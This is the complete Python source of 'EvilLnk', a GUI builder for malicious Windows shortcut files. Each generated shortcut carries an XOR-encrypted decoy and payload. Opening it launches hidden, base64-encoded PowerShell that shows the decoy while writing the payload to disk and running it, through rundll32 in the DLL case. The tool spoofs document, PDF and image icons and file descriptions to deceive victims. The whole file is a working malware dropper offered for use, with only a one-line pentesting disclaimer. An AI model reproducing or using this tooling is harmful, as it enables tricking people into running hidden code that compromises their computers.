#!/usr/bin/python3
#Coded by d1mov (Radostin Dimov)
import pylnk3
import subprocess
import random
import string
import sys
import re
import os
import base64
from datetime import datetime
from PyQt6.QtWidgets import QApplication, QWidget, QLabel, QVBoxLayout, QHBoxLayout,QRadioButton,QButtonGroup, QLineEdit, QPushButton, QTextEdit, QMessageBox, QComboBox, QFileDialog, QMenuBar
from PyQt6.QtCore import QObject, Qt
from PyQt6.QtGui import QIcon, QAction, QPixmap

loader_template = '''$filename = $env:lnkfilename;
$key = [System.Text.Encoding]::UTF8.GetBytes('#replacemexorkey')[0];

$decoy_start_byte = 0x00003000;
$decoy_filelength = #replacemedecoylength;
$payload_start_byte = #replacemepayloadstartbyte;
$payload_filelength = #replacemepayloadlength;

$decoy_file = "$env:temp\\#replacemedecoyname";
#replacemesavedfile
#replacemedllep

function get_directory {

    param (
        $filename
    )

    if (-not(Test-Path $filename))
    {
        $file_directory = Get-ChildItem -Path ./ -Filter $filename -Recurse;
        if (-not $file_directory)
        {
            exit;
        }
        return $file_directory.DirectoryName;
    }
    return $(pwd).Path;
};

function get_filestream {

    param (
        $filename,
        $directory
    )

    [IO.Directory]::SetCurrentDirectory($directory);
    $filestream = New-Object IO.FileStream $filename,'Open','Read','ReadWrite';
    return $filestream;
};

function get_data_from_file {

    param (
        $filestream,
        $start_byte,
        $filelength
    )

    $bytearray = New-Object byte[]($filelength);
    $r = $filestream.Seek($start_byte,[IO.SeekOrigin]::Begin);
    $r = $filestream.Read($bytearray,0,$filelength);
    return $bytearray;
};

function xor_decode {

    param (
        $b,
        $l,
        $k
    )

    for($i = 0; $i -lt $l; $i++)
    {
        $b[$i] = $b[$i] -bxor $k;
    };
};

function extract_and_write_file {

    param (
        $filestream,
        $start_byte,
        $filelength,
        $outfilename,
        $key
    )

    $bytearray = get_data_from_file $filestream $start_byte $filelength;
    xor_decode $bytearray $filelength $key;
    [IO.File]::WriteAllBytes($outfilename, $bytearray);
};

$lnk_directory = get_directory $filename;
$filestream = get_filestream $filename $lnk_directory;
extract_and_write_file $filestream $decoy_start_byte $decoy_filelength $decoy_file $key;
Invoke-Item $decoy_file;
#replacemepayloadexec'''


stage1_command_template = '''$script_start_byte = #replacemeloaderstartbyte
$script_length = #replacemescriptlength;
$filename = Get-ChildItem *.lnk | Where-Object {$_.Length -eq #replacemetotallnkfilesize} | Select-Object -ExpandProperty Name;
$env:lnkfilename = $filename;

if (-not(Test-Path $filename))
{
$val = Get-ChildItem -Path ./ -Filter $filename -Recurse;
if (-not $val)
{
exit
}
[IO.Directory]::SetCurrentDirectory($val.DirectoryName);
}
$filestream = New-Object IO.FileStream $filename,'Open','Read','ReadWrite';
$val = New-Object byte[]($script_length);
$r = $filestream.Seek($script_start_byte,[IO.SeekOrigin]::Begin);
$r = $filestream.Read($val,0,$script_length);
$val = [Convert]::FromBase64CharArray($val,0,$val.Length);
$string = [Text.Encoding]::ASCII.GetString($val);
iex $string;'''


dllexec = '''extract_and_write_file $filestream $payload_start_byte $payload_filelength $payload_file $key;
if($ENV:PROCESSOR_ARCHITECTURE -eq $("AMD64"))
{
    & ($("rundll32.exe")) $payload_file $(",") $dll_entrypoint
}
$filestream.Close();'''

exeexec = '''extract_and_write_file $filestream $payload_start_byte $payload_filelength $payload_file $key;
Invoke-Item $payload_file;'''


icon = '#replaceme'
icon_index = '#replaceme'
filetype = '#replaceme'
lnkfilename = 'example.lnk'
hrlnkfilesize = '#replaceme'

def xor_encrypt_payload_decoy(filecontent, xor_key):
    try:
        def xor(data, key):
            return bytearray([a ^ ord(key) for a in data])
        encrypted_content = xor(filecontent, xor_key)
        return encrypted_content

    except Exception as e:
        print(f'[-] Encryption failed: {e}')
        return None


def insert_info(lnk, target_full, target_directory, arguments, icon, icon_index=0, description=None):
    lnk.specify_local_location(target_full)

    lnk._link_info.size_local_volume_table = 0
    lnk._link_info.volume_label = ""
    lnk._link_info.drive_serial = 0
    lnk._link_info.local = True
    lnk.window_mode = 'Minimized'

    if arguments is not None:
        lnk.arguments = arguments
    if icon is not None:
        lnk.icon = icon
        lnk.icon_index = icon_index

    lnk._link_info.local_base_path = target_full
    lnk.working_dir = target_directory

    if description is not None:
        lnk.description = description

def build_entry(name, is_dir):
    entry = pylnk3.PathSegmentEntry()
    entry.type = pylnk3.TYPE_FOLDER if is_dir else pylnk3.TYPE_FILE
    entry.file_size = 0

    n = datetime.now()
    entry.modified = n
    entry.created = n
    entry.accessed = n

    entry.short_name = name
    entry.full_name = entry.short_name

    return entry


def write_lnk(lnk):
    with open(lnk.file, 'wb') as f:
        lnk.write(f)

def create_lnk(stage1base64_encoded): 
    global icon
    global icon_index
    global lnkfilename
    global filetype
    global hrlnkfilesize

    target = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'

    arguments = '-noni -noe -WindowStyle hidden -e ' + stage1base64_encoded

    name = lnkfilename

    target_split = target.split('\\')
    target_file = target_split[-1]
    target_drive = target_split[0]
    target_directory = '%CD%'

    current_date = datetime.now()
    formatted_date = current_date.strftime("%d/%m/%Y %H:%M")
    description = f"Type: {filetype}\nSize: {hrlnkfilesize}\nDate modified: {formatted_date}"

    lnk = pylnk3.create(name)

    insert_info(lnk, target, target_directory, arguments, icon, icon_index, description)

    levels = list(pylnk3.path_levels(target))
    elements = [pylnk3.RootEntry(pylnk3.ROOT_MY_COMPUTER), pylnk3.DriveEntry(target_drive)]

    for level in target_split[1:-1]:
        entry = build_entry(level, is_dir=True)
        elements.append(entry)

    entry = build_entry(target_file, is_dir=False)
    elements.append(entry)

    lnk.shell_item_id_list = pylnk3.LinkTargetIDList()
    lnk.shell_item_id_list.items = elements

    write_lnk(lnk)


def auto_int(x):
    return int(x, 0)


def append_file(source, seek=None):
    global lnkfilename
    dest = lnkfilename
    with open(source, 'rb') as in_file:
        data = in_file.read()

    with open(dest, 'ab') as out_file:
        if seek:
            seek_length = seek - out_file.tell()
            if seek_length < 0:
                print('[-] Error: The seek offset must be greater than the length of the destination file.')
                sys.exit(1)
            out_file.write(bytearray((chr(0) * seek_length).encode('utf-8')))

        out_file.write(data)


class MainWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("EvilLnk")
        self.setWindowIcon(QIcon("img/evillnk.png"))
        layout = QVBoxLayout()
        
        menu_bar = QMenuBar()
        evillnk_menu = menu_bar.addMenu("evillnk")
        help_menu = menu_bar.addMenu("About")
        homepage_action = QAction("Homepage", self)
        evillnk_menu.addAction(homepage_action)
        homepage_action.triggered.connect(self.homepage)
        about_action = QAction("Overview", self)
        help_menu.addAction(about_action)
        about_action.triggered.connect(self.about)
        layout.setMenuBar(menu_bar)
        
        payloadtype_layout = QHBoxLayout()
        payload_type_label = QLabel("Payload Type:")
        payloadtype_layout.addWidget(payload_type_label)
        self.payload_type_input = QComboBox()
        self.payload_type_input.addItem("Executable")
        self.payload_type_input.addItem("Dynamic-link library")
        self.payload_type_input.addItem("PowerShell Script")
        self.payload_type_input.currentIndexChanged.connect(self.handle_payload_type_change)
        payloadtype_layout.addWidget(self.payload_type_input)
        layout.addLayout(payloadtype_layout)

        payload_layout = QHBoxLayout()
        payload_file_label = QLabel("Payload file:")
        self.payload_file_input = QLineEdit()
        self.payload_browse_button = QPushButton("Browse")
        self.payload_browse_button.setFixedWidth(100)
        self.payload_browse_button.clicked.connect(self.handle_payload_type_change)
        payload_layout.addWidget(payload_file_label)
        payload_layout.addWidget(self.payload_file_input)
        payload_layout.addWidget(self.payload_browse_button)
        layout.addLayout(payload_layout)

        dll_ep_layout = QHBoxLayout()
        self.dll_entrypoint_label = QLabel("DLL Entry Point:")
        self.dll_entrypoint_input = QLineEdit()
        self.dll_entrypoint_label.setVisible(False)
        self.dll_entrypoint_input.setVisible(False)
        dll_ep_layout.addWidget(self.dll_entrypoint_label)
        dll_ep_layout.addWidget(self.dll_entrypoint_input)
        layout.addLayout(dll_ep_layout)
        
        decoy_layout = QHBoxLayout()
        decoy_file_label = QLabel("Decoy file:")
        self.decoy_file_input = QLineEdit()
        self.decoy_browse_button = QPushButton("Browse")
        self.decoy_browse_button.setFixedWidth(100)
        self.decoy_browse_button.clicked.connect(self.handle_payload_type_change)
        decoy_layout.addWidget(decoy_file_label)
        decoy_layout.addWidget(self.decoy_file_input)
        decoy_layout.addWidget(self.decoy_browse_button)
        layout.addLayout(decoy_layout)

        buttons_and_icon_layout = QHBoxLayout()
        displayicon_container = QWidget()
        displayicon_layout = QVBoxLayout(displayicon_container)
        displayicon_container.setStyleSheet("QWidget { border: 1px solid black; padding: 5px; }")
        display_icon_label = QLabel("Display Icon:")
        display_icon_label.setFixedWidth(290)
        displayicon_layout.addWidget(display_icon_label)

        buttons1_layout = QHBoxLayout()
        self.doc_button = QRadioButton("DOC")
        self.doc_button.setChecked(True)
        self.txt_button = QRadioButton("TXT")
        self.folder_button = QRadioButton("Folder")
        buttons1_layout.addWidget(self.doc_button)
        buttons1_layout.addWidget(self.txt_button)
        buttons1_layout.addWidget(self.folder_button)
        displayicon_layout.addLayout(buttons1_layout)

        buttons2_layout = QHBoxLayout()
        self.jpg_button = QRadioButton("JPG")
        self.zip_button = QRadioButton("ZIP")
        self.mp3_button = QRadioButton("MP3")
        buttons2_layout.addWidget(self.jpg_button)
        buttons2_layout.addWidget(self.zip_button)
        buttons2_layout.addWidget(self.mp3_button)
        displayicon_layout.addLayout(buttons2_layout)

        buttons3_layout = QHBoxLayout()
        self.pdf_button = QRadioButton("PDF")
        self.video_button = QRadioButton("Video")
        buttons3_layout.addWidget(self.pdf_button)
        buttons3_layout.addWidget(self.video_button)
        displayicon_layout.addLayout(buttons3_layout)

        icon_button_group = QButtonGroup()
        icon_button_group.addButton(self.doc_button)
        icon_button_group.addButton(self.txt_button)
        icon_button_group.addButton(self.jpg_button)
        icon_button_group.addButton(self.zip_button)
        icon_button_group.addButton(self.folder_button)
        icon_button_group.addButton(self.mp3_button)
        icon_button_group.addButton(self.pdf_button)
        icon_button_group.addButton(self.video_button)

        buttons_and_icon_layout.addWidget(displayicon_container)

        icon_preview_container = QWidget()
        icon_preview_layout = QVBoxLayout(icon_preview_container)
        icon_preview_container.setStyleSheet("QWidget { border: 1px solid black; padding: 5px; }")
        icon_preview_label = QLabel("Icon Preview:")
        icon_preview_layout.addWidget(icon_preview_label)

        self.icon_display_label = QLabel()
        icon_preview_layout.addWidget(self.icon_display_label)

        buttons_and_icon_layout.addWidget(icon_preview_container)
        layout.addLayout(buttons_and_icon_layout)

        self.doc_button.toggled.connect(self.update_icon)
        self.txt_button.toggled.connect(self.update_icon)
        self.jpg_button.toggled.connect(self.update_icon)
        self.zip_button.toggled.connect(self.update_icon)
        self.folder_button.toggled.connect(self.update_icon)
        self.mp3_button.toggled.connect(self.update_icon)
        self.pdf_button.toggled.connect(self.update_icon)
        self.video_button.toggled.connect(self.update_icon)
        self.update_icon()

        console_label = QLabel("Building Console")
        layout.addWidget(console_label)
        self.console = QTextEdit()
        self.console.setMinimumSize(450, 150)
        self.console.setReadOnly(True)
        layout.addWidget(self.console)

        generate_button = QPushButton("Generate")
        generate_button.setFixedWidth(150)
        generate_button.clicked.connect(self.generate_payload)
        layout.addWidget(generate_button, alignment=Qt.AlignmentFlag.AlignHCenter)
        
        self.setLayout(layout)

    def homepage(self):
        QMessageBox.about(self, "Homepage", "evillnk Github repo:\n\nhttps://github.com/d1mov/evillnk")

    def about(self):
        QMessageBox.about(self, "About", "evillnk 1.1.1\n\nPython GUI based tool to generate lnk files with a payload and decoy files embedded inside.\nIt takes payload file and decoy file as input, converts them to xor encrypted bytes and append them at the end of the lnk file.\n\nTo be used for pentesting or educational purposes only.\n\nCoded by: d1mov (Radostin Dimov)")
        
    def update_icon(self):
        icon_size = 75

        if self.doc_button.isChecked():
            pixmap = QPixmap('img/doc.ico')
        elif self.txt_button.isChecked():
            pixmap = QPixmap('img/txt.png')
        elif self.jpg_button.isChecked():
            pixmap = QPixmap('img/jpg.ico')
        elif self.zip_button.isChecked():
            pixmap = QPixmap('img/zip.ico')
        elif self.folder_button.isChecked():
            pixmap = QPixmap('img/folder.ico')
        elif self.mp3_button.isChecked():
            pixmap = QPixmap('img/mp3.ico')
        elif self.pdf_button.isChecked():
            pixmap = QPixmap('img/pdf.ico')
        elif self.video_button.isChecked():
            pixmap = QPixmap('img/video.png')

        pixmap = pixmap.scaled(icon_size, icon_size)
        self.icon_display_label.setPixmap(pixmap)

    def handle_payload_type_change(self, index):
        payload_type = self.payload_type_input.currentText()
        if payload_type == "Dynamic-link library":
            self.dll_entrypoint_label.setVisible(True)
            self.dll_entrypoint_input.setVisible(True)
        else:
            self.dll_entrypoint_label.setVisible(False)
            self.dll_entrypoint_input.setVisible(False)

        bbutton1 = QObject.sender(self.payload_browse_button)
        if bbutton1 is self.payload_browse_button:
            file_path, _ = QFileDialog.getOpenFileName(self, "Select payload File")
            if file_path:
                self.payload_file_input.setText(file_path)

        bbutton2 = QObject.sender(self.decoy_browse_button)
        if bbutton2 is self.decoy_browse_button:
            file_path, _ = QFileDialog.getOpenFileName(self, "Select decoy File")
            if file_path:
                self.decoy_file_input.setText(file_path)


    def generate_payload(self):
        global loader_template
        global stage1_command_template
        global icon
        global icon_index
        global dllexec
        global exeexec
        global filetype
        global hrlnkfilesize
        global lnkfilename
        payload_type = self.payload_type_input.currentText()
        payload_file_input = self.payload_file_input.text()
        decoy_file_input = self.decoy_file_input.text()
        if not payload_file_input:
            self.console.append("[*] No Payload File Specified!")
            return
        if not os.path.isfile(payload_file_input):
            self.console.append("[*] Specified Payload File does not exist!")
            return
        if payload_type == "Executable":
            if not payload_file_input.lower().endswith(".exe"):
                self.console.append("[*] Input error! Payload type is: Executable")
                return
        if payload_type == "Dynamic-link library":
            if not payload_file_input.lower().endswith(".dll"):
                self.console.append("[*] Input error! Payload type is: Dynamic-link library")
                return
        if payload_type == "PowerShell Script":
            if not payload_file_input.lower().endswith(".ps1"):
                self.console.append("[*] Input error! Payload type is: PowerShell Script")
                return
        if not decoy_file_input:
            self.console.append("[*] No Decoy File Specified!")
            return
        if not os.path.isfile(decoy_file_input):
            self.console.append("[*] Specified Decoy File does not exist!")
            return
        dll_ep = self.dll_entrypoint_input.text()
        decoyname = os.path.basename(decoy_file_input)
        decoysize = os.path.getsize(decoy_file_input)
        payloadname = os.path.basename(payload_file_input)        
        payloadsize = os.path.getsize(payload_file_input)
        payload_start_byte = 0x00003000 + decoysize + 1
        loader_start_byte = 0x00003000 + decoysize + 1 + payloadsize + 1
        xor_key = random.choice(string.ascii_lowercase + string.digits)
        loader_template = loader_template.replace('#replacemexorkey', xor_key)
        
        if self.txt_button.isChecked():
            icon = 'C:\\Windows\\System32\\notepad.exe'
            icon_index = 0
            filetype = 'Text Document'
        elif self.jpg_button.isChecked():
            icon = 'C:\\Windows\\System32\\imageres.dll'
            icon_index = 67
            filetype = 'JPG File'
        elif self.folder_button.isChecked():
            icon = 'C:\\Windows\\System32\\SHELL32.dll'
            icon_index = 4
            filetype = 'Folder'
        elif self.zip_button.isChecked():
            icon = 'C:\\Windows\\System32\\imageres.dll'
            icon_index = 165
            filetype = 'Compressed (zipped) Folder'
        elif self.mp3_button.isChecked():
            icon = 'C:\\Windows\\System32\\imageres.dll'
            icon_index = 125
            filetype = 'MP3'
        elif self.doc_button.isChecked():
            icon = 'C:\\Windows\\System32\\SHELL32.dll'
            icon_index = 1
            filetype = 'Document'
        elif self.pdf_button.isChecked():
            icon = '%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe'
            icon_index = 11
            filetype = 'PDF'
        elif self.video_button.isChecked():
            icon = 'C:\\Windows\\System32\\SHELL32.dll'
            icon_index = 118
            filetype = 'Video'
        
        if payload_type == "PowerShell Script":
            loader_start_byte = 0x00003000 + decoysize + 1
        elif payload_type == "Dynamic-link library":
            loader_template = loader_template.replace('#replacemesavedfile', f'$payload_file = "$env:localappdata\\{payloadname}";')
            loader_template = loader_template.replace('#replacemepayloadexec', dllexec)
            loader_template = loader_template.replace('#replacemedllep', f'$dll_entrypoint = "{dll_ep}"')
        elif payload_type == "Executable":
            loader_template = loader_template.replace('#replacemesavedfile', f'$payload_file = "$env:localappdata\\{payloadname}";')
            loader_template = loader_template.replace('#replacemepayloadexec', exeexec)
        
        try:
            QApplication.processEvents()
            self.console.append("[*] Reading payload file...")
            with open(payload_file_input, 'rb') as file:
                content = file.read()
            if payload_type != "PowerShell Script":
                self.console.append("[*] Encrypting payload File")
                payloadfile_enc = xor_encrypt_payload_decoy(content, xor_key)
                payloadbyte_count = len(payloadfile_enc)
                with open('payload_enc', 'wb') as file:
                    file.write(payloadfile_enc)
                self.console.append(f"[*] Success! Encrypted Payload size: {payloadbyte_count} bytes")
            if payload_type == "PowerShell Script":
                ps1_content = content.decode('utf-8').strip()
                loader_template = loader_template.replace('#replacemepayloadexec', ps1_content)
            self.console.append("[*] Reading decoy file...")
            with open(decoy_file_input, 'rb') as file:
                content = file.read()
            self.console.append("[*] Encrypting decoy File")
            decoyfile_enc = xor_encrypt_payload_decoy(content, xor_key)
            decoybyte_count = len(decoyfile_enc)
            with open('decoy_enc', 'wb') as file:
                file.write(decoyfile_enc)
            self.console.append(f"[*] Success! Encrypted Decoy File size: {decoybyte_count} bytes")
            loader_template = loader_template.replace('#replacemedecoyname', str(decoyname))
            loader_template = loader_template.replace('#replacemedecoylength', str(decoybyte_count))
            if payload_type != "PowerShell Script":
                loader_template = loader_template.replace('#replacemepayloadstartbyte', f'0x{payload_start_byte:08x}')
                loader_template = loader_template.replace('#replacemepayloadlength', str(payloadbyte_count))
            self.console.append("[*] Generating Stage 2 Loader")
            loader_utf8_content = loader_template.encode('utf-8')
            loaderbase64_encoded = base64.b64encode(loader_utf8_content)
            with open('loader_enc', 'wb') as output_file:
                output_file.write(loaderbase64_encoded)
            script_length = len(loaderbase64_encoded)
            lnkfilesize = 0x00003000 + decoysize + 1 + payloadsize + 1 + script_length
            if payload_type == "PowerShell Script":
                lnkfilesize = 0x00003000 + decoysize + 1 + script_length
            totallnkfilesize = int(lnkfilesize)
            units = ["B", "KB", "MB", "GB"]
            index = 0
            while lnkfilesize >= 1024 and index < len(units) - 1:
                lnkfilesize /= 1024.0
                index += 1
            hrlnkfilesize = f"{lnkfilesize:.2f} {units[index]}"
            self.console.append(f"[*] Success! Stage 2 Loader saved! Size: {script_length} bytes")
            self.console.append("[*] Generating Stage 1")
            stage1_command_template = stage1_command_template.replace('#replacemescriptlength', str(script_length))
            stage1_command_template = stage1_command_template.replace('#replacemetotallnkfilesize', str(totallnkfilesize))
            stage1_command_template = stage1_command_template.replace('#replacemeloaderstartbyte', f'0x{loader_start_byte:08x}')
            stage1_utf16le_content = stage1_command_template.encode('utf-16le')
            stage1base64_encoded = base64.b64encode(stage1_utf16le_content)
            stringstage1encoded = stage1base64_encoded.decode('utf-8')
            self.console.append("[*] Success! Stage 1 Generated!")
            create_lnk(stringstage1encoded)
            self.console.append("[*] Lnk File Generated !")
            decoysource = 'decoy_enc'
            decoyseek = 0x3000
            self.console.append("[*] Embedding decoy file")
            append_file(decoysource, decoyseek)
            self.console.append(f"[*] Decoy start byte is: 0x{decoyseek:08x}")
            self.console.append(f"[*] Decoy end byte is: 0x{payload_start_byte - 1:08x}")
            if payload_type != "PowerShell Script":
                payloadsource = 'payload_enc'
                payloadseek = hex(payload_start_byte)
                self.console.append(f"[*] Embedding payload file")
                append_file(payloadsource, int(payloadseek, 16))
                self.console.append(f"[*] Payload start byte is: 0x{payload_start_byte:08x}")
                self.console.append(f"[*] Payload end byte is: 0x{loader_start_byte - 1:08x}")
            loadersource = 'loader_enc'
            loaderseek = hex(loader_start_byte)
            append_file(loadersource, int(loaderseek, 16))
            self.console.append(f"[*] Loader start byte is: 0x{loader_start_byte:08x}")
            self.console.append(f"[*] Loader end byte is: 0x{loader_start_byte + script_length:08x}")
            with open(lnkfilename, 'rb') as file:
                lnkfilecontent = file.read()
            subprocess.run(['rm', lnkfilename])
            self.console.append("[*] Cleaning Up...")
            subprocess.run(['rm', 'decoy_enc'])
            if payload_type != "PowerShell Script":
                subprocess.run(['rm', 'payload_enc'])
            subprocess.run(['rm', 'loader_enc'])
            output_file, _ = QFileDialog.getSaveFileName(self, "Save Output File", 'example.lnk', "lnk Files (*.lnk)")
            if output_file:
                with open(output_file, 'wb') as saved_file:
                    saved_file.write(lnkfilecontent)
                self.console.append(f"[*] Done! Lnk file saved to {output_file}")
                QMessageBox.about(self, "Success!", "Success! Lnk file generated and saved!")
            else:
                self.console.append("[*] Lnk File saving canceled!")
        
        except ValueError as e:
            self.console.append(f"Error: {e}")

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec())
